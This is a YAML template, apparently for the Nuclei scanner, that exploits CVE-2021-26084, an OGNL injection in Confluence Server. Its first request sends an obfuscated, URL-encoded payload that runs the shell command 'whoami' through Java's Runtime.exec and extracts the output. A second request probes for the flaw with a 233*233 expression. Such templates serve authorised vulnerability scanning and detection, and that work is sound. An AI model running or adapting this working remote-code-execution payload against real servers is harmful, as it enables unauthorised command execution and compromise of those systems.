id: Confluence-doenterpagevariables-rce-cve-2021-26084
info:
  author: dhiyaneshDk,philippedelteil
  name: Confluence Server OGNL injection - RCE
requests:
  - raw:
      - |
        POST /pages/doenterpagevariables.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        queryString=%20%20%20%20%20%20%20%20%5c%75%30%30%32%37%2b%7b%0a%20%20%20%20%20%20%20%20%43%6c%61%73%73%2e%66%6f%72%4e%61%6d%65%28%5c%75%30%30%32%37%6a%61%76%61%78%2e%73%63%72%69%70%74%2e%53%63%72%69%70%74%45%6e%67%69%6e%65%4d%61%6e%61%67%65%72%5c%75%30%30%32%37%29%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%29%2e%67%65%74%45%6e%67%69%6e%65%42%79%4e%61%6d%65%28%5c%75%30%30%32%37%4a%61%76%61%53%63%72%69%70%74%5c%75%30%30%32%37%29%2e%5c%75%30%30%36%35%76%61%6c%28%5c%75%30%30%32%37%0a%20%20%20%20%20%20%20%20%76%61%72%20%63%6d%64%20%3d%20%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%5c%75%30%30%32%32%77%68%6f%61%6d%69%5c%75%30%30%32%32%29%3b%0a%20%20%20%20%20%20%20%20%76%61%72%20%69%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%63%6d%64%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%3b%0a%20%20%20%20%20%20%20%20%76%61%72%20%62%75%66%66%65%72%65%64%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%69%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%29%3b%0a%20%20%20%20%20%20%20%20%76%61%72%20%6c%69%6e%65%20%3d%20%5c%75%30%30%32%32%5c%75%30%30%32%32%3b%0a%20%20%20%20%20%20%20%20%76%61%72%20%6f%75%74%70%75%74%20%3d%20%32%33%33%2a%32%33%33%3b%0a%20%20%20%20%20%20%20%20%77%68%69%6c%65%28%28%6c%69%6e%65%20%3d%20%62%75%66%66%65%72%65%64%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%29%20%21%3d%20%6e%75%6c%6c%29%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%75%74%70%75%74%20%3d%20%6f%75%74%70%75%74%20%2b%20%6c%69%6e%65%20%2b%20%6a%61%76%61%2e%6c%61%6e%67%2e%43%68%61%72%61%63%74%65%72%2e%74%6f%53%74%72%69%6e%67%28%31%30%29%3b%0a%20%20%20%20%20%20%20%20%7d%5c%75%30%30%32%37%29%7d%2b%5c%75%30%30%32%37
      - |
        POST /pages/doenterpagevariables.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        queryString=xxxscan%5cu0027%2b%7b233*233%7d%2b%5cu0027

    stop-at-first-match: true

    matchers:
      - type: dsl
        dsl:
          - "contains(body,'54289')"

    extractors:
      - type: xpath
        name: whoami
        internal: true
        part: body
        xpath:
          - //input[@name='queryString']/@value

      - type: xpath
        part: body
        xpath:
          - //input[@name='queryString']/@value


